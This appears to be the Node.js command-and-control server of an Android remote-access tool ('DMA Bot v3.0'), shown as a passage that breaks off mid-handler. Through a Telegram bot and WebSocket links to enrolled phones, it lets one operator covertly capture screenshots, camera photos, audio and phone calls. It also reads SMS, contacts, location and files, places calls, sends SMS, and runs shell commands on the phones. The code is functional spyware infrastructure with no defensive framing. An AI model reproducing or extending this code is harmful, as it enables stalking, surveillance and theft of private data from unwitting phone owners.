require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const helmet = require('helmet');

// ============================================
// CONFIGURATION
// ============================================
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 8999;

if (!token) {
    console.error('❌ TELEGRAM_BOT_TOKEN not set');
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });

app.set('trust proxy', 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: '50mb' }));

// ============================================
// DATA STORAGE
// ============================================
const connectedDevices = new Map();
const userSessions = new Map();
let bot = null;
let botPolling = false;

// ============================================
// DIRECTORY SETUP
// ============================================
['uploads', 'screenshots', 'recordings', 'photos'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// ============================================
// FILE UPLOAD
// ============================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'file';
        let dir = 'uploads';
        if (type.includes('screenshot')) dir = 'screenshots';
        else if (type.includes('audio')) dir = 'recordings';
        else if (type.includes('photo')) dir = 'photos';
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const timestamp = Date.now();
        const ext = path.extname(file.originalname);
        cb(null, `${deviceId}_${timestamp}${ext}`);
    }
});

const upload = multer({ 
    storage, 
    limits: { fileSize: 100 * 1024 * 1024 } 
});

// ============================================
// TELEGRAM BOT SETUP - FIXED 409 ERROR
// ============================================
async function stopExistingBot() {
    if (bot) {
        try {
            await bot.stopPolling();
            console.log('✅ Existing bot polling stopped');
        } catch (e) {
            console.log('⚠️ No existing bot to stop');
        }
        bot = null;
    }
    
    return new Promise((resolve) => {
        const req = https.request({
            hostname: 'api.telegram.org',
            path: `/bot${token}/deleteWebhook?drop_pending_updates=true`,
            method: 'GET'
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                console.log('✅ Webhook deleted');
                resolve();
            });
        });
        req.on('error', resolve);
        req.end();
    });
}

async function startBot() {
    await stopExistingBot();
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    return new Promise((resolve, reject) => {
        try {
            console.log('🤖 Starting bot...');
            
            bot = new TelegramBot(token, {
                polling: true,
                onlyFirstMatch: true,
                filepath: false,
                polling: {
                    interval: 300,
                    autoStart: true,
                    params: {
                        timeout: 10
                    }
                }
            });

            bot.getMe().then((me) => {
                console.log(`✅ Bot connected: @${me.username}`);
                setupBotCommands();
                setupBotHandlers();
                botPolling = true;
                resolve(bot);
            }).catch(reject);

            bot.on('polling_error', (error) => {
                if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
                    console.error('⚠️ 409 Conflict - Another instance running');
                    stopExistingBot().then(() => {
                        setTimeout(() => {
                            botPolling = false;
                            startBot();
                        }, 3000);
                    });
                }
            });

        } catch (error) {
            reject(error);
        }
    });
}

// ============================================
// BOT COMMANDS - ALL VISIBLE
// ============================================
async function setupBotCommands() {
    if (!bot) return;
    
    const commands = [
        { command: 'start', description: '🚀 Start DMA bot' },
        { command: 'help', description: '❓ Show help' },
        { command: 'menu', description: '⌨️ Show device action menu' },
        { command: 'list', description: '📱 List all devices' },
        { command: 'info', description: 'ℹ️ Get device info (ID)' },
        { command: 'screenshot', description: '📸 Take screenshot (ID)' },
        { command: 'camera', description: '📷 Take photo (ID + front/rear)' },
        { command: 'record', description: '🎤 Record audio (ID + seconds)' },
        { command: 'location', description: '📍 Get location (ID)' },
        { command: 'browse', description: '📁 Browse files (ID)' },
        { command: 'download', description: '📥 Download file (ID + path)' },
        { command: 'call', description: '📞 Make call (ID + number)' },
        { command: 'sms', description: '💬 Send SMS (ID + number + text)' },
        { command: 'contacts', description: '📒 Get contacts (ID)' },
        { command: 'messages', description: '📨 Get messages (ID)' },
        { command: 'apps', description: '📱 List apps (ID)' },
        { command: 'shell', description: '🖥️ Run command (ID + cmd)' },
        { command: 'record_call', description: '📞 Start call recording (ID)' },
        { command: 'stop_call', description: '⏹️ Stop call recording (ID)' },
        { command: 'notify', description: '🔔 Send notification (ID + title + msg)' }
    ];

    try {
        await bot.setMyCommands(commands);
        console.log(`✅ ${commands.length} commands registered`);
    } catch (error) {
        console.error('❌ Failed to set commands:', error.message);
    }
}

// ============================================
// SINGLE DEVICE ACTION MENU - ALL ACTIONS IN ONE
// ============================================
const deviceActionMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'ℹ️ Info', callback_data: `info_${deviceId}` },
                { text: '📱 Apps', callback_data: `apps_${deviceId}` },
                { text: '📍 Location', callback_data: `location_${deviceId}` }
            ],
            [
                { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
                { text: '📷 Camera', callback_data: `camera_${deviceId}` },
                { text: '🎤 Record', callback_data: `record_${deviceId}` }
            ],
            [
                { text: '📁 Browse', callback_data: `browse_${deviceId}` },
                { text: '📥 Download', callback_data: `download_${deviceId}` }
            ],
            [
                { text: '📞 Call', callback_data: `call_${deviceId}` },
                { text: '💬 SMS', callback_data: `sms_${deviceId}` },
                { text: '📒 Contacts', callback_data: `contacts_${deviceId}` }
            ],
            [
                { text: '📨 Messages', callback_data: `messages_${deviceId}` },
                { text: '🖥️ Shell', callback_data: `shell_${deviceId}` }
            ],
            [
                { text: '📞 Record Call', callback_data: `record_call_${deviceId}` },
                { text: '⏹️ Stop Call', callback_data: `stop_call_${deviceId}` }
            ],
            [
                { text: '🔔 Notify', callback_data: `notify_${deviceId}` }
            ]
        ]
    }
});

// ============================================
// WEBSOCKET SERVER
// ============================================
wss.on('connection', (ws, req) => {
    const deviceId = req.headers['device-id'];
    const deviceModel = req.headers['device-model'] || 'Unknown';
    
    if (!deviceId) {
        return ws.close(1008, 'No Device ID');
    }

    console.log(`✅ Device connected: ${deviceId} (${deviceModel})`);
    
    ws.deviceId = deviceId;
    connectedDevices.set(deviceId, { 
        ws, 
        info: { id: deviceId, model: deviceModel, connectedAt: Date.now() },
        lastSeen: Date.now()
    });

    if (bot && botPolling) {
        bot.sendMessage(adminId, 
            `📱 *Device Connected*\nModel: ${deviceModel}\nID: \`${deviceId}\``, 
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    }

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            handleDeviceMessage(deviceId, msg);
        } catch (e) {}
        const device = connectedDevices.get(deviceId);
        if (device) device.lastSeen = Date.now();
    });

    ws.on('close', () => {
        connectedDevices.delete(deviceId);
        if (bot && botPolling) {
            bot.sendMessage(adminId, 
                `📴 *Device Disconnected*\n\`${deviceId}\``, 
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
        console.log(`❌ Device disconnected: ${deviceId}`);
    });

    ws.send(JSON.stringify({
        type: 'command',
        id: uuidv4(),
        command: 'get_device_info',
        timestamp: Date.now()
    }));
});

// ============================================
// DEVICE MESSAGE HANDLER
// ============================================
function handleDeviceMessage(deviceId, message) {
    if (message.type === 'response' && message.data) {
        handleCommandResponse(deviceId, message);
    } else if (message.type === 'device_info') {
        const device = connectedDevices.get(deviceId);
        if (device) {
            device.info = { ...device.info, ...message.data };
        }
    }
}

function handleCommandResponse(deviceId, response) {
    if (!bot || !botPolling) return;
    
    const device = connectedDevices.get(deviceId);
    const model = device?.info?.model?.split(' ')[0] || deviceId.substring(0, 8);
    
    if (!response.success) {
        bot.sendMessage(adminId, `❌ *Failed*\nDevice: ${model}\nError: ${response.error || 'Unknown'}`, 
            { parse_mode: 'Markdown' }).catch(e => {});
        return;
    }

    if (response.data?.lat && response.data?.lng) {
        bot.sendLocation(adminId, response.data.lat, response.data.lng).catch(e => {});
        bot.sendMessage(adminId, 
            `📍 *Location - ${model}*\nLat: \`${response.data.lat}\`\nLng: \`${response.data.lng}\``,
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.device) {
        const msg = 
`📱 *${response.data.model || model}*
━━━━━━━━━━━━━
🤖 Android: ${response.data.android || '?'} (SDK ${response.data.sdk || '?'})
🔋 Battery: ${response.data.battery?.toFixed(0) || '?'}%
💾 Free: ${formatBytes(response.data.internal_free)}
📦 Apps: ${response.data.apps_count || 0}
📶 Network: ${response.data.network_type || '?'}`;
        bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.contacts) {
        bot.sendMessage(adminId, `📒 *Contacts - ${model}*\nContacts retrieved`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.apps) {
        bot.sendMessage(adminId, `📱 *Apps - ${model}*\nTotal: ${response.data.count || 0}`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.call_made) {
        bot.sendMessage(adminId, `📞 *Call Initiated*\nNumber: ${response.data.number}`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.sms_sent) {
        bot.sendMessage(adminId, `💬 *SMS Sent*\nTo: ${response.data.number}`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.messages) {
        bot.sendMessage(adminId, `📨 *Messages Retrieved*`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.files) {
        bot.sendMessage(adminId, `📁 *Files Listed*\nPath: ${response.data.path || '/'}`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.output) {
        const out = response.output.substring(0, 200);
        bot.sendMessage(adminId, `🖥️ *Output*\n\`\`\`${out}\`\`\``, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.call_recording_started) {
        bot.sendMessage(adminId, `📞 *Call Recording Started*\nNumber: ${response.data.number || 'Unknown'}`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else if (response.data?.call_recording_ended) {
        bot.sendMessage(adminId, `⏹️ *Call Recording Ended*`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
    else {
        bot.sendMessage(adminId, `✅ *Success*\nDevice: ${model}`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
}

// ============================================
// SEND COMMAND TO DEVICE
// ============================================
function sendCommandToDevice(deviceId, command, data = {}) {
    let device = connectedDevices.get(deviceId);
    
    if (!device) {
        const lowerId = deviceId.toLowerCase();
        for (let [id, dev] of connectedDevices.entries()) {
            if (id.toLowerCase() === lowerId) {
                device = dev;
                deviceId = id;
                break;
            }
        }
    }
    
    if (!device) return false;
    
    const cmdObj = {
        type: 'command',
        id: uuidv4(),
        command: command,
        data: data,
        timestamp: Date.now()
    };
    
    try {
        device.ws.send(JSON.stringify(cmdObj));
        return true;
    } catch (e) {
        return false;
    }
}

// ============================================
// BOT COMMAND HANDLERS - ORIGINAL WORKING METHOD
// ============================================
function setupBotHandlers() {
    if (!bot) return;

    // === START ===
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        bot.sendMessage(chatId, 
            `🤖 *DMA Bot v3.0*\n━━━━━━━━━━━━━\n` +
            `📱 Devices: ${connectedDevices.size}\n` +
            `📋 Type /list to see devices\n` +
            `🎯 Use commands with device ID\n` +
            `⌨️ Or use /menu after selecting device`,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    });

    // === HELP ===
    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const help = 
`🤖 *DMA Bot - All Commands*
━━━━━━━━━━━━━━━━━━━━━━

*📱 DEVICE MANAGEMENT*
/list - List all devices
/info [device_id] - Get device info

*📸 MEDIA CAPTURE*
/screenshot [device_id] - Take screenshot
/camera [device_id] [front/rear] - Take photo
/record [device_id] [seconds] - Record audio

*📍 LOCATION & FILES*
/location [device_id] - Get GPS location
/browse [device_id] - Browse files
/download [device_id] [path] - Download file

*📞 COMMUNICATION*
/call [device_id] [number] - Make call
/sms [device_id] [number] [text] - Send SMS
/contacts [device_id] - Get contacts
/messages [device_id] - Get SMS messages

*📱 APPLICATIONS*
/apps [device_id] - List installed apps

*🖥️ ADVANCED*
/shell [device_id] [command] - Run shell command

*📞 CALL RECORDING*
/record_call [device_id] - Start call recording
/stop_call [device_id] - Stop call recording

*🔔 NOTIFICATIONS*
/notify [device_id] [title] [msg] - Send notification

*❓ OTHER*
/menu [device_id] - Show action menu for device
/help - This message

━━━━━━━━━━━━━━━━━━━━━━
💡 *Example:* \`/screenshot SM_G960U_9d13\`
💡 *Example:* \`/call SM_G960U_9d13 1234567890\`
💡 *Tip:* Copy device ID from /list command`;
        
        bot.sendMessage(chatId, help, { parse_mode: 'Markdown' }).catch(e => {});
    });

    // === LIST DEVICES ===
    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '📭 No devices connected');
        }
        
        let text = `📱 *Connected Devices (${connectedDevices.size}):*\n\n`;
        connectedDevices.forEach((device, id) => {
            const model = device.info?.model || 'Unknown';
            const battery = device.info?.battery ? `${device.info.battery.toFixed(0)}%` : '?';
            text += `• *${model}* [${battery}]\n`;
            text += `  \`${id}\`\n\n`;
        });
        text += `_Copy the device ID and use with commands:_\n`;
        text += `\`/screenshot PASTE_ID_HERE\``;
        
        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' }).catch(e => {});
    });

    // === MENU - Show action menu for specific device ===
    bot.onText(/\/menu(?:\s+(.+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        let deviceId = match[1];
        
        if (!deviceId) {
            // If no device ID provided, show list first
            if (connectedDevices.size === 0) {
                return bot.sendMessage(chatId, '📭 No devices connected');
            }
            
            let text = `📱 *Select a device by copying its ID:*\n\n`;
            connectedDevices.forEach((device, id) => {
                const model = device.info?.model || 'Unknown';
                text += `• *${model}*\n`;
                text += `  \`${id}\`\n\n`;
            });
            text += `_Then use: /menu YOUR_DEVICE_ID_`;
            
            return bot.sendMessage(chatId, text, { parse_mode: 'Markdown' }).catch(e => {});
        }
        
        deviceId = deviceId.trim();
        const device = connectedDevices.get(deviceId);
        
        if (!device) {
            return bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
        
        const model = device.info?.model?.split(' ')[0] || 'Device';
        
        bot.sendMessage(chatId, 
            `📱 *${model} - Device Menu*\n` +
            `ID: \`${deviceId}\`\n\n` +
            `*Select action:*`,
            { 
                parse_mode: 'Markdown',
                reply_markup: deviceActionMenu(deviceId).reply_markup 
            }
        ).catch(e => {});
    });

    // === INFO COMMAND ===
    bot.onText(/\/info (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'get_device_info')) {
            bot.sendMessage(chatId, `ℹ️ Getting info for \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === SCREENSHOT COMMAND ===
    bot.onText(/\/screenshot (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'take_screenshot')) {
            bot.sendMessage(chatId, `📸 Taking screenshot on \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === CAMERA COMMAND ===
    bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const cameraType = match[2].toLowerCase();
        const type = cameraType.includes('front') ? 'front' : 'rear';
        
        if (sendCommandToDevice(deviceId, 'take_photo', { camera: type })) {
            bot.sendMessage(chatId, `📷 Taking ${type} camera photo...`).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === RECORD COMMAND ===
    bot.onText(/\/record (.+) (\d+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const seconds = parseInt(match[2]);
        
        if (sendCommandToDevice(deviceId, 'record_audio', { seconds })) {
            bot.sendMessage(chatId, `🎤 Recording ${seconds}s on \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === LOCATION COMMAND ===
    bot.onText(/\/location (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'get_location')) {
            bot.sendMessage(chatId, `📍 Getting location from \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === BROWSE COMMAND ===
    bot.onText(/\/browse (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        setUserSession(chatId, { state: 'awaiting_browse_path', deviceId });
        bot.sendMessage(chatId, 
            `📁 *Enter path to browse on ${deviceId.substring(0, 8)}...*\n` +
            `Example: \`/storage/emulated/0/Download\``,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    });

    // === DOWNLOAD COMMAND ===
    bot.onText(/\/download (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        setUserSession(chatId, { state: 'awaiting_download_path', deviceId });
        bot.sendMessage(chatId, 
            `📥 *Enter file path to download from ${deviceId.substring(0, 8)}...*\n` +
            `Example: \`/storage/emulated/0/Download/file.pdf\``,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    });

    // === CALL COMMAND ===
    bot.onText(/\/call (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const number = match[2].trim();
        
        if (sendCommandToDevice(deviceId, 'make_call', { number })) {
            bot.sendMessage(chatId, `📞 Calling ${number} on \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === SMS COMMAND ===
    bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const number = match[2].trim();
        const message = match[3].trim();
        
        if (sendCommandToDevice(deviceId, 'send_sms', { number, message })) {
            bot.sendMessage(chatId, `💬 Sending SMS to ${number}...`).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === CONTACTS COMMAND ===
    bot.onText(/\/contacts (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'list_contacts')) {
            bot.sendMessage(chatId, `📒 Getting contacts from \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === MESSAGES COMMAND ===
    bot.onText(/\/messages (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'get_messages')) {
            bot.sendMessage(chatId, `📨 Getting messages from \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === APPS COMMAND ===
    bot.onText(/\/apps (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'list_apps')) {
            bot.sendMessage(chatId, `📱 Getting apps from \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === SHELL COMMAND ===
    bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const command = match[2].trim();
        
        if (sendCommandToDevice(deviceId, 'execute', { cmd: command })) {
            bot.sendMessage(chatId, `🖥️ Executing command on \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === RECORD CALL COMMAND ===
    bot.onText(/\/record_call (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'start_call_recording')) {
            bot.sendMessage(chatId, `📞 Starting call recording on \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === STOP CALL COMMAND ===
    bot.onText(/\/stop_call (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'stop_call_recording')) {
            bot.sendMessage(chatId, `⏹️ Stopping call recording...`).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === NOTIFY COMMAND ===
    bot.onText(/\/notify (.+) (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const title = match[2].trim();
        const message = match[3].trim();
        
        if (sendCommandToDevice(deviceId, 'send_notification', { title, message })) {
            bot.sendMessage(chatId, `🔔 Notification sent to \`${deviceId.substring(0, 8)}...\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        } else {
            bot.sendMessage(chatId, `❌ Device not found: \`${deviceId}\``, 
                { parse_mode: 'Markdown' }).catch(e => {});
        }
    });

    // === CALLBACK QUERY HANDLER ===
    bot.on('callback_query', async (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;
        const data = callbackQuery.data;
        
        if (chatId.toString() !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Unauthorized' }).catch(e => {});
            return;
        }
        
        await bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
        
        const parts = data.split('_');
        const action = parts[0];
        const deviceId = parts.slice(1).join('_');
        
        const device = connectedDevices.get(deviceId);
        if (!device) {
            await bot.sendMessage(chatId, `❌ Device not found or disconnected`).catch(e => {});
            return;
        }
        
        switch(action) {
            case 'info':
                sendCommandToDevice(deviceId, 'get_device_info');
                await bot.sendMessage(chatId, `ℹ️ Getting device info...`).catch(e => {});
                break;
            case 'apps':
                sendCommandToDevice(deviceId, 'list_apps');
                await bot.sendMessage(chatId, `📱 Getting apps list...`).catch(e => {});
                break;
            case 'location':
                sendCommandToDevice(deviceId, 'get_location');
                await bot.sendMessage(chatId, `📍 Getting location...`).catch(e => {});
                break;
            case 'screenshot':
                sendCommandToDevice(deviceId, 'take_screenshot');
                await bot.sendMessage(chatId, `📸 Taking screenshot...`).catch(e => {});
                break;
            case 'camera':
                await bot.sendMessage(chatId, 
                    `📷 Select camera:`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '📷 Front', callback_data: `camera_front_${deviceId}` },
                                    { text: '📷 Rear', callback_data: `camera_rear_${deviceId}` }
                                ]
                            ]
                        }
                    }
                ).catch(e => {});
                break;
            case 'camera_front':
                sendCommandToDevice(deviceId, 'take_photo', { camera: 'front' });
                await bot.sendMessage(chatId, `📷 Taking front camera photo...`).catch(e => {});
                break;
            case 'camera_rear':
                sendCommandToDevice(deviceId, 'take_photo', { camera: 'rear' });
                await bot.sendMessage(chatId, `📷 Taking rear camera photo...`).catch(e => {});
                break;
            case 'record':
                await bot.sendMessage(chatId, 
                    `🎤 Select duration:`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '5s', callback_data: `record_5_${deviceId}` },
                                    { text: '10s', callback_data: `record_10_${deviceId}` },
                                    { text: '30s', callback_data: `record_30_${deviceId}` }
                                ],
                                [
                                    { text: '1m', callback_data: `record_60_${deviceId}` },
                                    { text: '5m', callback_data: `record_300_${deviceId}` },
                                    { text: '10m', callback_data: `record_600_${deviceId}` }
                                ]
                            ]
                        }
                    }
                ).catch(e => {});
                break;
            case 'record_5':
            case 'record_10':
            case 'record_30':
            case 'record_60':
            case 'record_300':
            case 'record_600':
                const seconds = parseInt(action.split('_')[1]);
                sendCommandToDevice(deviceId, 'record_audio', { seconds });
                await bot.sendMessage(chatId, `🎤 Recording ${seconds}s...`).catch(e => {});
                break;
            case 'browse':
                setUserSession(chatId, { state: 'awaiting_browse_path', deviceId });
                await bot.sendMessage(chatId, 
                    `📁 *Enter path to browse:*\n` +
                    `Example: \`/storage/emulated/0/Download\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
                break;
            case 'download':
                setUserSession(chatId, { state: 'awaiting_download_path', deviceId });
                await bot.sendMessage(chatId, 
                    `📥 *Enter file path to download:*\n` +
                    `Example: \`/storage/emulated/0/Download/file.pdf\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
                break;
            case 'call':
                setUserSession(chatId, { state: 'awaiting_call_number', deviceId });
                await bot.sendMessage(chatId, `📞 *Enter phone number:*`).catch(e => {});
                break;
            case 'sms':
                setUserSession(chatId, { state: 'awaiting_sms_number', deviceId });
                await bot.sendMessage(chatId, `💬 *Enter phone number:*`).catch(e => {});
                break;
            case 'contacts':
                sendCommandToDevice(deviceId, 'list_contacts');
                await bot.sendMessage(chatId, `📒 Getting contacts...`).catch(e => {});
                break;
            case 'messages':
                sendCommandToDevice(deviceId, 'get_messages');
                await bot.sendMessage(chatId, `📨 Getting messages...`).catch(e => {});
                break;
            case 'shell':
                setUserSession(chatId, { state: 'awaiting_shell_command', deviceId });
                await bot.sendMessage(chatId, `🖥️ *Enter shell command:*`).catch(e => {});
                break;
            case 'record_call':
                sendCommandToDevice(deviceId, 'start_call_recording');
                await bot.sendMessage(chatId, `📞 Starting call recording...`).catch(e => {});
                break;
            case 'stop_call':
                sendCommandToDevice(deviceId, 'stop_call_recording');
                await bot.sendMessage(chatId, `⏹️ Stopping call recording...`).catch(e => {});
                break;
            case 'notify':
                setUserSession(chatId, { state: 'awaiting_notification_title', deviceId });
                await bot.sendMessage(chatId, `🔔 *Enter notification title:*`).catch(e => {});
                break;
        }
    });

    // === MESSAGE HANDLER FOR INPUTS ===
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        
        if (chatId.toString() !== adminId || !text) return;
        if (text.startsWith('/')) return;
        
        const session = getUserSession(chatId);
        if (!session) return;
        
        if (session.state === 'awaiting_browse_path' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'list_files', { path: text.trim() });
            bot.sendMessage(chatId, `📁 Browsing ${text.trim()}...`).catch(e => {});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_download_path' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'get_file', { path: text.trim() });
            bot.sendMessage(chatId, `📥 Downloading ${text.trim()}...`).catch(e => {});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_call_number' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'make_call', { number: text.trim() });
            bot.sendMessage(chatId, `📞 Calling ${text.trim()}...`).catch(e => {});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_sms_number' && session.deviceId) {
            setUserSession(chatId, { 
                state: 'awaiting_sms_text', 
                deviceId: session.deviceId, 
                number: text.trim() 
            });
            bot.sendMessage(chatId, `💬 *Enter SMS message:*`).catch(e => {});
        }
        else if (session.state === 'awaiting_sms_text' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'send_sms', { 
                number: session.number, 
                message: text.trim() 
            });
            bot.sendMessage(chatId, `💬 Sending SMS...`).catch(e => {});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_shell_command' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'execute', { cmd: text.trim() });
            bot.sendMessage(chatId, `🖥️ Executing command...`).catch(e => {});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_notification_title' && session.deviceId) {
